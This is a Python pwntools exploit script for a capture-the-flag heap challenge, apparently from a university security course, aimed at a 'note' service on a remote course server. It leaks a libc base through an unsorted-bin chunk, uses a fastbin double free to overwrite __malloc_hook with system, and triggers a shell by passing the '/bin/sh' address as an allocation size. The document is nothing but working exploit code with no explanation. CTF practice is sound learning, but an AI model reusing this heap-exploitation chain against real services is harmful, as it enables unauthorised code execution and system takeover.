#!/usr/bin/env python
from pwn import *
context.arch = 'amd64'


#r = process('./note')
r = remote('edu-ctf.csie.org',10178)
libc = ELF('./libc-2.23.so')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def cmd(x):
    r.recvuntil('>')
    r.send(x)

def add(s,l):
    cmd('1')
    r.recvuntil('Size: ')
    r.send(str(int(l)))
    r.recvuntil('Note: ')
    r.send(s)

def show(i):
    cmd('2')
    r.recvuntil('Index: ')
    r.send(str(i))

def delete(i):
    cmd('3')
    r.recvuntil('Index: ')
    r.send(str(i))


add('a'*16,0x100) # unsortbin
add('b'*16,0x68) #
delete(0)
show(0)

r.recvuntil(':\n')
leak = u64(r.recvuntil('\n')[:-1].ljust(8,'\x00'))
libc_base = leak - 0x3c4b78
print hex(libc_base)

malloc_hook = libc_base + libc.symbols['__malloc_hook']
bin_sh = libc_base + 0x18cd57
system_addr = libc_base + libc.symbols['system']

delete(1)

add('b'*16,0x68) #0
add('c'*16,0x68) #1
add('d'*16,0x68) #2
delete(0)
delete(1)
delete(0)
# __malloc_hook - 0x10 - 3 : size=0x7f

add(p64(malloc_hook - 0x10 - 3) ,0x68)
add('b',0x68)
add('c',0x68)

add('aaa' + p64(system_addr) ,0x68)

cmd('1')
r.recvuntil('Size: ')
r.send(str(bin_sh))


r.interactive()
